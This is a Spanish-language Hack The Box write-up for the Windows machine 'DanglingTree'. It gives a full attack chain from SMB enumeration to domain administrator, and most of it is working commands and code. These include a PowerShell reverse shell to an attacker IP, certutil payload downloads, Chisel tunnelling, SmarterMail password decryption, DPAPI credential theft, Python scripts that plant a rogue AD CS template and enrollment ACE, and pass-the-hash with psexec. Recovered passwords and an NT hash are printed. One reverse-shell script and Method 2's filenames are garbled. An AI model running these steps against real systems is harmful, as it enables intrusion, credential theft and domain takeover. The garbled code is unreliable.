[English](README.md) | [Español](README-ES.md)

[![HTB](https://img.shields.io/badge/HTB-DanglingTree-brightgreen)](https://www.hackthebox.com/)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-9cf)](#)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](#)
[![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-red)](https://www.hackthebox.com/)

# HTB: DanglingTree

Guía paso a paso de **DanglingTree**, cubriendo la cadena de ataque completa desde la enumeración inicial hasta obtener acceso como Domain Administrator y acceso a nivel de root.

> **Nota:** Este write-up tiene fines educativos y fue realizado contra el objetivo de Hack The Box.

---

## 📋 Ruta de Ataque

```text
Enumeración SMB
      │
      ▼
PDF con credenciales
      │
      ▼
anderson.w
      │
      ▼
war_rce.py → RCE
      │
      ▼
Subir Chisel
      │
      ▼
Acceso a SmarterMail vinculado a 127.0.0.1
      │
      ▼
Configuración de SmarterMail
      │
      ▼
password_encrypted
      │
      ▼
SmarterMail.Standard.dll
      │
      ▼
CryptographyHelper
      │
      ▼
Clave DES-CBC + IV
      │
      ▼
Credenciales de noah.b
      │
      ▼
RunasCs.exe
      │
      ▼
noah.b
      │
      ├── user.txt
      │
      └── DPAPI Master Key
              │
              ▼
        Credential Blob
              │
              ▼
            alex.o
              │
              ▼
      Cambiar contraseña de jake.h
              │
              ▼
      Abuso de Certificate Template
              │
              ▼
       Sincronizar hora del sistema
              │
              ▼
        Solicitar certificado
              │
              ▼
     administrator.pfx
              │
              ▼
       Autenticación con Certipy
              │
              ▼
    Hash NT de Administrator
              │
              ▼
          psexec
              │
              ▼
              ROOT
```

---

# 1. 🔎 Enumeración Inicial

Comenzamos enumerando los servicios expuestos.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Enumeramos los recursos compartidos:

```bash
smbclient -L //<IP>/ -N
```

También podemos utilizar:

```bash
nxc smb <IP> --shares
```

Durante esta fase, encontramos un recurso que contiene documentación.

Al revisar los archivos disponibles, encontramos un **PDF que contiene credenciales**.

Estas credenciales son importantes porque nos permiten continuar con el acceso remoto a Windows.

> ⚠️ En esta máquina, la enumeración SMB no solo sirve para identificar recursos compartidos: el PDF encontrado proporciona las credenciales utilizadas en la siguiente etapa.

Las credenciales de este documento se utilizan para obtener la cuenta inicial:

```text
anderson.w
```

Este es un paso importante porque el PDF proporciona las credenciales necesarias para el primer acceso autenticado al host Windows.

---

# 2. 💻 Acceso Inicial como `anderson.w`

El acceso inicial a Windows se obtiene utilizando el script `war_rce.py`.

Iniciamos un listener en Kali:

```bash
nc -lvnp 4444
```

Luego ejecutamos el script RCE utilizando las credenciales obtenidas del PDF.

```bash
python3 scripts/war_rce.py <USERNAME> '<PASSWORD>' <TARGET_IP> <COMMAND>
```

Para obtener una shell interactiva:

```bash
python3 scripts/war_rce.py <USERNAME> '<PASSWORD>' <TARGET_IP> --shell
```

El punto importante aquí es que `war_rce.py` forma parte de la cadena de acceso inicial.

Hacemos un archivo ps1 (coloca la ip de tu kali)
```bash
cat > reverse.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

Codificamos a base 64
```bash
# Guardar el payload generado
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0 > reverse_b64.txt

# Verificar
cat reverse_b64.txt
```

Ejecutamos el payload en Windows (coloca la ip objetivo)
```bash
python3 scripts/war_rce.py anderson.w 'Password123!' 10.129.81.107 "powershell -e $(cat reverse_b64.txt)"
```

Y obtenemos una shell interactiva como `anderson.w`.

---

# 3. 🔀 Pivoting con Chisel

El siguiente objetivo es acceder a un servicio interno que únicamente está escuchando en:

Utilizando:

```powershell
netstat -ano | findstr LISTEN
```

Encontramos:

```text
127.0.0.1
```

En particular, SmarterMail expone funcionalidad localmente en el host Windows, por lo que necesitamos crear un túnel de este servicio hacia Kali.

## 3.1 Descargar Chisel

Chisel puede obtenerse desde su página oficial de releases:

[Chisel Releases](https://github.com/jpillora/chisel/releases?utm_source=chatgpt.com)

En Kali:

```bash
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.11.5_windows_amd64.gz
```

Como alternativa, podemos descargar el binario de Windows correspondiente desde la página de releases.

El ejecutable se transfiere posteriormente al objetivo Windows.

---

## 3.2 Transferir Chisel a Windows

Iniciamos un servidor HTTP en Kali:

```bash
python3 -m http.server 8081
```

En el objetivo Windows:

```powershell
cd C:\Users\anderson.w\Downloads
```

Descargamos Chisel:

```powershell
certutil -urlcache -split -f http://<KALI_IP>:8081/chisel.exe chisel.exe
```

Verificamos:

```powershell
dir chisel.exe
```

---

## 3.3 Iniciar el servidor Chisel

En Kali:

```bash
./chisel server -p 9001 --reverse
```

Luego, desde Windows:

```powershell
.\chisel.exe client <KALI_IP>:9001 R:17017:127.0.0.1:17017
```

Esto crea el siguiente túnel:

```text
Kali:17017
     │
     │ Túnel reverse de Chisel
     ▼
Windows:127.0.0.1:17017
```

El mismo comando puede ejecutarse como un trabajo en segundo plano:

```powershell
Start-Job -ScriptBlock {
    C:\Windows\Temp\chisel.exe client -v <KALI_IP>:9001 R:17017:127.0.0.1:17017
}
```

En Kali, crea el script de reverse shell, (usa la ip de tu kali):
```bash
cat > reverse.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.234',4445);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = stream.Read(bytes, 0, $bytes.Length)) -ne 0){
    data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString(bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    sendbyte=([text.encoding]::ASCII).GetBytes(sendback2);
    stream.Write(sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
```

En Kali, generamos la versión codificada:
```bash
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0
```

El resultado anterior se pone como valor de PAYLOAD en hub.py.

En kali dejamos  escuchando:
```bash
nc -lvnp 4445
```

Corremos el archivo:
```bash
python3 hub.py
```

Y en la terminal de Windows de Anderson:

### Metodo 1
```powershell
$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'
Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
```

### Metodo2

Creamos
```bash
```bash
cat > smtp_exploit.ps1 << 'EOF'
$body = '{"hubAddress":"http://10.10.14.234:8081/","oneTimePassword":"test","nodeName":"victim"}'; Invoke-WebRequest -Uri http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub -Method POST -Body $body -ContentType "application/json"
EOF
```

Codificamos:
```bash
cat revshell.ps1 | iconv -t UTF-16LE | base64 -w 0 > smtp_exploit.b64
```

Ejecutamos en kali:
```bash
python3 wac_rce.py anderson.w 'R3dT3am@Acc3ss#01' "powershell -e $(cat smtp_exploit.b64)"
```

Cualquiera de los dos motodos nos dara acces a svc_mail y a la interfaz de SmarterMail.

---

# 4. 📧 Enumeración de SmarterMail

Una vez establecido el túnel, el servicio vinculado a `127.0.0.1` se vuelve accesible desde Kali.

Desde el host Windows, navegamos hasta la instalación de SmarterMail:

```powershell
cd "C:\Program Files (x86)\SmarterTools\SmarterMail\Service"
```

Localizamos:

```text
SmarterMail.Standard.dll
```

También podemos inspeccionar los datos del dominio:

```powershell
cd C:\SmarterMail\Domains\danglingtree.htb.bak\Users
```

Inspeccionamos los directorios de usuarios:

```powershell
dir
```

Por ejemplo:

```powershell
cd noah.b
cat settings.json
```

Dentro de `settings.json` encontramos:

```json
"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
```

Esta contraseña cifrada se convierte en nuestro siguiente objetivo.

---

# 5. 🧩 Extraer `SmarterMail.Standard.dll`

Para analizar la implementación criptográfica de SmarterMail, copiamos la DLL a Kali.

Iniciamos un servidor SMB en Kali:

```bash
impacket-smbserver share . -smb2support -username kali -password kali
```

Desde Windows:

```powershell
net use \\<KALI_IP>\share /user:kali kali
```

Copiamos la DLL:

```powershell
copy SmarterMail.Standard.dll \\<KALI_IP>\share
```

En Kali:

```bash
ls -la SmarterMail.Standard.dll
```

---

# 6. 🔐 Analizar la Criptografía de SmarterMail

Primero buscamos cadenas relacionadas con criptografía:

```bash
strings SmarterMail.Standard.dll | grep -i "Cryptography"
strings SmarterMail.Standard.dll | grep -i "Decrypt"
strings SmarterMail.Standard.dll | grep -i "Encrypt"
strings SmarterMail.Standard.dll | grep -i "Password"
```

Una búsqueda más específica:

```bash
strings SmarterMail.Standard.dll | \
grep -A5 -B5 "CryptographyHelper\|InternalSetKey\|DecryptPassword\|DecryptPasswordSt"
```

---

## 6.1 Instalar `ilspycmd`

Instalamos el repositorio de paquetes de Microsoft:

```bash
wget https://packages.microsoft.com/config/debian/13/packages-microsoft-prod.deb \
    -O packages-microsoft-prod.deb

sudo dpkg -i packages-microsoft-prod.deb
rm packages-microsoft-prod.deb
```

Instalamos .NET:

```bash
sudo apt-get update
sudo apt-get install -y dotnet-sdk-10.0
```

Verificamos:

```bash
dotnet --version
```

Instalamos `ilspycmd`:

```bash
dotnet tool install --global ilspycmd
```

Si ya está instalado:

```bash
dotnet tool update --global ilspycmd
```

Agregamos el directorio de herramientas de .NET:

```bash
export PATH="$PATH:/root/.dotnet/tools"
```

Verificamos:

```bash
ilspycmd --version
```

---

## 6.2 Descompilar `CryptographyHelper`

Ejecutamos:

```bash
ilspycmd SmarterMail.Standard.dll \
    -t SmarterMail.Standard.Utilities.CryptographyHelper
```

La implementación revela las constantes utilizadas por SmarterMail.

Los arrays de bytes pueden convertirse a hexadecimal:

```bash
python3 -c 'print(bytes([180, 63, 132, 209, 16, 180, 233, 145]).hex())'
```

Salida:

```text
b43f84d110b4e991
```

Para el IV:

```bash
python3 -c 'print(bytes([1, 216, 174, 230, 73, 173, 146, 39]).hex())'
```

Salida:

```text
01d8aee649ad9227
```

Por lo tanto:

```text
Key: b43f84d110b4e991
IV:  01d8aee649ad9227
```

La corrección importante es que se trata de **DES-CBC**, no AES-CBC.

---

# 7. 🍳 Descifrar la Contraseña de SmarterMail

El valor cifrado:

```text
66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby
```

puede procesarse con CyberChef utilizando:

```text
From Base64
    ↓
DES Decrypt
```

Parámetros:

```text
Key: b43f84d110b4e991
IV:  01d8aee649ad9227
Mode: CBC
Input: Raw
Output: Raw
```

CyberChef:

[Receta DES-CBC de CyberChef](https://cyberchef.io/?utm_source=chatgpt.com#recipe=From_Base64%28'A-Za-z0-9%2B/%3D',true%29DES_Decrypt%28%7B'option':'Hex','string':'b43f84d110b4e991'%7D,%7B'option':'Hex','string':'01d8aee649ad9227'%7D,'CBC','Raw','Raw'%29&input=NjZlN3BwTE9CRjdVZHpEdjN6SzZNSjFybXlVYjFDYnk%3D)

Las credenciales resultantes son:

```text
Username: noah.b
Password: RiverDragon#Storm25
```

---

# 8. 🪟 Ejecutar Comandos como `noah.b`

Descargamos `RunasCs.exe` desde los releases oficiales:

[RunasCs Releases](https://github.com/antonioCoco/RunasCs/releases?utm_source=chatgpt.com)

En Kali:

```bash
wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
unzip RunasCs.zip
ls -la RunasCs.exe
```

Iniciamos el servidor HTTP:

```bash
python3 -m http.server 9090
```

En Windows:

```powershell
cd C:\Users\svc_mail\Documents
```

Descargamos el ejecutable:

```powershell
certutil -urlcache -split -f http://<KALI_IP>:9090/RunasCs.exe RunasCs.exe
```

Verificamos las opciones disponibles:

```powershell
.\RunasCs.exe -h
```

Ejecutamos PowerShell como `noah.b`:

```powershell
.\RunasCs.exe noah.b 'RiverDragon#Storm25' powershell -r <KALI_IP>:5555
```

En Kali, escuchamos la conexión:

```bash
nc -lvnp 5555
```

Ahora tenemos una shell como:

```text
noah.b
```

---

# 9. 🏁 Flag de Usuario

La flag de usuario se encuentra en el Desktop:

```powershell
cd C:\Users\noah.b\Desktop
type user.txt
```

---

# 10. 🗝️ Enumeración de DPAPI

Antes de extraer el material DPAPI, identificamos el SID de `noah.b`:

```powershell
whoami /all
```

El SID relevante es:

```text
S-1-5-21-4220238332-57023728-1129110646-1602
```

Inspeccionamos el directorio de la DPAPI Master Key:

```powershell
dir "C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602" -Force
```

La Master Key encontrada es:

```text
f53fcaba-f057-48e8-8f92-0180d274bf0f
```

Inspeccionamos las credenciales almacenadas:

```powershell
dir C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials -Force
```

El credential blob es:

```text
57FFB67D684C67F09E7153B9C7CC3940
```

---

# 11. 📤 Transferir los Archivos DPAPI a Kali

En Kali:

```bash
impacket-smbserver share . -smb2support -username kali -password kali
```

En Windows:

```powershell
net use \\<KALI_IP>\share /user:kali kali
```

Copiamos la Master Key:

```powershell
copy "C:\Users\noah.b\AppData\Roaming\Microsoft\Protect\S-1-5-21-4220238332-57023728-1129110646-1602\f53fcaba-f057-48e8-8f92-0180d274bf0f" \\<KALI_IP>\share\
```

Copiamos el credential blob:

```powershell
copy "C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940" \\<KALI_IP>\share\
```

---

# 12. 🔓 Descifrar la DPAPI Master Key

Utilizando la contraseña de `noah.b`:

```bash
impacket-dpapi masterkey \
    -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
    -sid S-1-5-21-4220238332-57023728-1129110646-1602 \
    -password 'RiverDragon#Storm25'
```

La Master Key descifrada se obtiene de la salida.

Utilizamos esa clave para descifrar el credential blob:

```bash
impacket-dpapi credential \
    -file 57FFB67D684C67F09E7153B9C7CC3940 \
    -key '<DECRYPTED_MASTER_KEY>'
```

La credencial almacenada revela:

```text
Username : alex.o
Password : SunsetMountainPeak@2025
```

---

# 13. 🔑 Credenciales Almacenadas

De vuelta en el host Windows, inspeccionamos las credenciales almacenadas:

```powershell
cmdkey /list
```

Encontramos:

```text
Currently stored credentials:

    Target: Domain:target=PC01.danglingtree.htb
    Type: Domain Password
    User: alex.o
```

Esto confirma que `alex.o` está asociado con una credencial de dominio almacenada.

---

# 14. 🏛️ Enumeración de Certificate Services

Utilizando las credenciales recuperadas, enumeramos el entorno AD CS:

```bash
certipy-ad find \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -stdout \
    -enabled | grep "Template Name"
```

La CA expone varios certificate templates, incluyendo:

```text
KerberosAuthentication
DirectoryEmailReplication
DomainControllerAuthentication
SubCA
WebServer
DomainController
Machine
EFSRecovery
Administrator
EFS
User
```

Consultamos directamente el enrollment service mediante LDAP:

```bash
LDAPTLS_REQCERT=never ldapsearch \
    -H ldaps://<DC_IP>:636 \
    -x \
    -D 'jake.h@danglingtree.htb' \
    -w 'Password123!' \
    -b 'CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
    '(objectClass=pKIEnrollmentService)' \
    certificateTemplates
```

La CA anuncia:

```text
RemoteAccessVPN
EmployeeAuthTemplate
VPNUserTemplate
DirectoryEmailReplication
DomainControllerAuthentication
KerberosAuthentication
EFSRecovery
EFS
DomainController
WebServer
Machine
User
SubCA
Administrator
```

---

# 15. 🔄 Cambiar la Contraseña de `jake.h`

Utilizando las credenciales recuperadas de `alex.o`:

```bash
net rpc password jake.h Password123! \
    -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" \
    -S <DC_IP>
```

Verificamos las credenciales:

```bash
nxc smb danglingtree.htb \
    -u jake.h \
    -p 'Password123!'
```

---

# 16. 🧾 Crear el Certificate Template

Nos autenticamos en LDAP como `jake.h` y creamos el `EmployeeAuthTemplate`.

```bash
python3 -c 'import struct,ssl;from ldap3 import Server,Connection,ALL,NTLM,Tls;tls=Tls(validate=ssl.CERT_NONE);c=Connection(Server("<DC_IP>",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\\jake.h",password="Password123!",authentication=NTLM,auto_bind=True);r=c.add("CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb",attributes={"objectClass":["top","pKICertificateTemplate"],"cn":"EmployeeAuthTemplate","displayName":"EmployeeAuthTemplate","flags":"131680","revision":"100","pKIDefaultKeySpec":"1","pKIKeyUsage":b"\xa0\x00","pKIMaxIssuingDepth":"0","pKICriticalExtensions":["2.5.29.15"],"pKIExtendedKeyUsage":["1.3.6.1.5.5.7.3.2"],"pKIDefaultCSPs":["1,Microsoft RSA SChannel Cryptographic Provider"],"pKIExpirationPeriod":struct.pack("<q",-315360000000000),"pKIOverlapPeriod":struct.pack("<q",-36288000000000),"msPKI-Certificate-Name-Flag":"1","msPKI-Enrollment-Flag":"0","msPKI-Minimal-Key-Size":"2048","msPKI-Private-Key-Flag":"0","msPKI-RA-Signature":"0","msPKI-Template-Minor-Revision":"1","msPKI-Template-Schema-Version":"2","msPKI-Certificate-Application-Policy":["1.3.6.1.5.5.7.3.2"],"msPKI-Cert-Template-OID":"1.3.6.1.4.1.311.21.8.9999999.8888888.7777777.6666666.5555555.1.33.1"});print("[+] Created" if r else "[-] "+str(c.result["description"]))'
```

---

# 17. 🛂 Agregar Permisos de Enrollment

Agregamos el ACE de enrollment requerido:

```bash
python3 -c '
import ssl,struct,uuid
from ldap3 import Server,Connection,ALL,NTLM,Tls,MODIFY_REPLACE,BASE
from ldap3.protocol.microsoft import security_descriptor_control

tls=Tls(validate=ssl.CERT_NONE)

c=Connection(
    Server("<DC_IP>",port=636,use_ssl=True,tls=tls,get_info=ALL),
    user="DANGLINGTREE\\jake.h",
    password="Password123!",
    authentication=NTLM,
    auto_bind=True
)

DN="CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"

ctrl=security_descriptor_control(sdflags=0x4)

c.search(
    DN,
    "(objectClass=*)",
    search_scope=BASE,
    attributes=["nTSecurityDescriptor"],
    controls=ctrl
)

sd=bytearray(c.entries[0]["nTSecurityDescriptor"].raw_values[0])

au=struct.pack("BB",1,1)+b"\x00\x00\x00\x00\x00\x05"+struct.pack("<I",11)
eg=uuid.UUID("0e10c968-78fb-11d2-90d4-00c04f79dc55").bytes_le
ab=struct.pack("<II",0x100,0x01)+eg+au
ace=struct.pack("BBH",5,0,4+len(ab))+ab

do=struct.unpack_from("<I",sd,16)[0]
ds=struct.unpack_from("<H",sd,do+2)[0]
ac=struct.unpack_from("<H",sd,do+4)[0]
ip=do+ds

sd=sd[:ip]+bytearray(ace)+sd[ip:]

struct.pack_into("<H",sd,do+2,ds+len(ace))
struct.pack_into("<H",sd,do+4,ac+1)

c.modify(
    DN,
    {"nTSecurityDescriptor":[(MODIFY_REPLACE,[bytes(sd)])]},
    controls=ctrl
)

print(
    "[+] Enrollment ACE added"
    if c.result["result"]==0
    else "[-] "+str(c.result)
)'
```

---

# 18. ⏰ Sincronizar el Reloj

Antes de solicitar el certificado, sincronizamos el reloj de Kali con el Domain Controller.

Kerberos es sensible a las diferencias de tiempo y puede fallar con:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

Comprobamos la hora actual:

```bash
timedatectl
```

Consultamos el DC:

```bash
sudo ntpdate -q <DC_IP>
```

Si es necesario, deshabilitamos NTP automático:

```bash
sudo timedatectl set-ntp false
```

Configuramos la hora del sistema con la hora del DC:

```bash
sudo date -s "YYYY-MM-DD HH:MM:SS"
```

Sincronizamos el reloj de hardware:

```bash
sudo hwclock --systohc
```

Verificamos:

```bash
timedatectl
```

El reloj local debería estar ahora dentro de la tolerancia aceptable de Kerberos.

---

# 19. 📜 Solicitar el Certificado de Administrator

Solicitamos un certificado para la cuenta Administrator:

```bash
certipy-ad req \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -ca 'danglingtree-DC-CA' \
    -target '<DC_IP>' \
    -template 'EmployeeAuthTemplate' \
    -upn 'administrator@danglingtree.htb' \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
```

Si utilizamos el hostname del DC:

```bash
certipy-ad req \
    -u 'jake.h@danglingtree.htb' \
    -p 'Password123!' \
    -dc-ip <DC_IP> \
    -ca 'danglingtree-DC-CA' \
    -target 'dc.danglingtree.htb' \
    -template 'EmployeeAuthTemplate' \
    -upn 'administrator@danglingtree.htb' \
    -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
```

La solicitud produce:

```text
administrator.pfx
```

---

# 20. 👑 Autenticarse como Administrator

Utilizamos el certificado generado:

```bash
certipy-ad auth \
    -debug \
    -pfx administrator.pfx \
    -dc-ip <DC_IP>
```

Certipy obtiene un TGT y recupera el hash NT:

```text
administrator@danglingtree.htb

aad3b435b51404eeaad3b435b51404ee:
8cacb3a97e460c65d105ca7cd9913925
```

---

# 21. 💀 Acceso Final

Utilizamos el hash NT de Administrator recuperado con Impacket:

```bash
impacket-psexec \
    -hashes aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925 \
    administrator@<DC_IP>
```

Verificamos:

```cmd
whoami
```

Resultado esperado:

```text
danglingtree\administrator
```

Ahora tenemos acceso administrativo al objetivo.

---

# 🧠 Conclusiones Principales

1. La **enumeración SMB** reveló un PDF que contenía las credenciales iniciales.
2. `war_rce.py` proporcionó la ejecución de comandos inicial como `anderson.w`.
3. **Chisel** permitió acceder a SmarterMail vinculado a `127.0.0.1`.
4. `SmarterMail.Standard.dll` reveló la implementación criptográfica.
5. El cifrado de contraseñas de SmarterMail utilizaba **DES-CBC**, con una clave y un IV recuperables.
6. Las credenciales descifradas permitieron ejecutar comandos como `noah.b`.
7. **DPAPI** se utilizó para recuperar una credencial almacenada perteneciente a `alex.o`.
8. Las credenciales recuperadas permitieron modificar la contraseña de `jake.h`.
9. **AD CS** fue abusado mediante un certificado personalizado.
10. Fue necesario sincronizar el reloj para evitar `KRB_AP_ERR_SKEW` de Kerberos.
11. Se solicitó un certificado para `administrator` utilizando el SID de Administrator.
12. `certipy-ad auth` recuperó el hash NT de Administrator.
13. **Pass-the-Hash con Impacket** proporcionó el acceso administrativo final.
